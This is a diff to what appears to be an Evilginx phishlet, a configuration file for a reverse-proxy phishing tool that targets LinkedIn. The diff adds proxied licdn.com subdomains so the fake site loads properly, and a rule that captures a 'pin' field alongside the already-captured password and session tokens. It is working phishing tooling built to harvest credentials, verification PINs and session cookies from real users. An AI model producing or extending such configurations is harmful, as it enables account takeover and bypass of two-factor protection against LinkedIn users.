@@ -2,6 +2,8 @@ author: '@mrgretzky'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'licdn.com', session: false, is_landing: false}
+  - {phish_sub: 'media', orig_sub: 'media', domain: 'licdn.com', session: false, is_landing: false}
 sub_filters: []
 auth_tokens:
   - domain: '.www.linkedin.com'
@@ -15,6 +17,10 @@ credentials:
     key: 'session_password'
     search: '(.*)'
     type: 'post'
+  custom:
+    - key: '^pin$'
+      search: '(.*)'
+      type: 'post'
 login:
   domain: 'www.linkedin.com'
   path: '/uas/login'
